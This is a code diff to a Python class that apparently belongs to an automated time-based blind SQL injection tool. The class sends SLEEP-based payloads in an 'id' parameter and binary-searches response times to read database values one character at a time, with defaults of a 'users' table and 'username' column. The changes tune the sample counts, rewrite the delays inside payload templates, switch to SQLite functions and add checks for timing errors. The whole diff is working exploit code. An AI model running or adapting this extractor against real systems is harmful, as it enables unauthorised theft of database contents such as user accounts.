@@ -5,6 +5,7 @@ Finds characters faster than linear search by using binary search.
 
 from typing import Optional, List
 import time
+import re
 import requests
 from .stats import TimingAnalyzer
 
@@ -32,7 +33,7 @@ class BinarySearchExtractor:
         # Cache for timing measurements
         self.baseline_cache: Optional[List[float]] = None
     
-    def _measure_request_time(self, payload: str, samples: int = 3) -> List[float]:
+    def _measure_request_time(self, payload: str, samples: int = 5) -> List[float]:
         """
         Measure request timing multiple times for statistical reliability.
         
@@ -43,17 +44,23 @@ class BinarySearchExtractor:
         Returns:
             List of timing measurements
         """
+        # Extract base URL without query parameters
+        if '?' in self.base_url:
+            url = self.base_url.split('?')[0]
+        else:
+            url = self.base_url
+        
         timings = []
         for _ in range(samples):
             start = time.time()
             try:
-                self.session.get(self.base_url, params={'id': payload}, timeout=30)
+                self.session.get(url, params={'id': payload}, timeout=30)
             except requests.RequestException:
                 pass
             timings.append(time.time() - start)
         return timings
     
-    def _establish_baseline(self, samples: int = 10) -> List[float]:
+    def _establish_baseline(self, samples: int = 15) -> List[float]:
         """
         Establish baseline timing by measuring requests without delays.
         
@@ -72,7 +79,7 @@ class BinarySearchExtractor:
         self.baseline_cache = baseline_timings
         return baseline_timings
     
-    def _test_condition(self, condition: str, samples: int = 5) -> bool:
+    def _test_condition(self, condition: str, samples: int = 7) -> bool:
         """
         Test if a SQL condition is true by measuring timing.
         
@@ -88,7 +95,18 @@ class BinarySearchExtractor:
         
         # Create payload with delay if condition is true
         # Format: condition can include SLEEP() or the template handles it
-        if "SLEEP" not in condition.upper():
+        if "SLEEP" in self.payload_template.upper():
+            # Template already includes SLEEP, replace hardcoded delay with detected delay
+            # Pattern: SLEEP(any_number) -> SLEEP(delay_seconds)
+            payload_template = re.sub(
+                r'SLEEP\([0-9.]+\)',
+                f'SLEEP({self.delay_seconds})',
+                self.payload_template,
+                flags=re.IGNORECASE
+            )
+            payload = payload_template.format(condition=condition)
+        elif "SLEEP" not in condition.upper():
+            # Template doesn't have SLEEP, add it to the condition
             payload = self.payload_template.format(
                 condition=f"({condition}) AND SLEEP({self.delay_seconds})"
             )
@@ -126,22 +144,63 @@ class BinarySearchExtractor:
         high = 126
         
         # Character extraction query template
-        char_query = f"ASCII(SUBSTRING((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1), {position}, 1))"
+        # Use SQLite-compatible functions: UNICODE() and SUBSTR()
+        # For MySQL, would use: ASCII(SUBSTRING(...))
+        char_query = f"UNICODE(SUBSTR((SELECT {column} FROM {table} WHERE {where_clause} LIMIT 1), {position}, 1))"
         
-        # Binary search
+        # Binary search to find the exact character value
+        # We're finding the maximum value where char >= value is true
         while low <= high:
             mid = (low + high) // 2
             
             # Test if character >= mid
             condition = f"{char_query} >= {mid}"
             if self._test_condition(condition):
+                # Character is >= mid, so search in upper half
                 low = mid + 1
             else:
+                # Character is < mid, so search in lower half
                 high = mid - 1
         
-        # Check if we found a valid character
+        # After loop exits: low > high
+        # The binary search finds the maximum value where char >= value is true
+        # When the loop exits:
+        #   - low is the first value where char >= low was FALSE (or we ran out of range)
+        #   - high is the last value where char >= high was TRUE
+        # So the character value should be: high (since char >= high is true, but char < low)
+        # However, due to timing errors, we verify a small range
+        
+        # The most likely candidate is high, but we also check high+1 and high-1
+        # to handle timing errors
+        candidates_to_test = []
+        
+        # Primary candidate: high (the last confirmed value where char >= high was true)
+        if 32 <= high <= 126:
+            candidates_to_test.append(high)
+        
+        # Also check high+1 (in case we stopped one early due to timing error)
+        if high + 1 <= 126:
+            candidates_to_test.append(high + 1)
+        
+        # Also check high-1 (in case we overshot due to timing error)
+        if high - 1 >= 32:
+            candidates_to_test.append(high - 1)
+        
+        # Remove duplicates and sort (test higher values first for efficiency)
+        candidates_to_test = sorted(set(candidates_to_test), reverse=True)
+        
+        # Test each candidate and return the first one that matches
+        for test_val in candidates_to_test:
+            exact_condition = f"{char_query} = {test_val}"
+            if self._test_condition(exact_condition):
+                return chr(test_val)
+        
+        # If no exact match found (shouldn't happen often), return the most likely candidate
         if 32 <= high <= 126:
             return chr(high)
+        
+        # If high < 32, it means the character is not in printable range
+        # Return None to indicate end of string
         return None
     
     def extract_string(self, table: str = "users", column: str = "username",
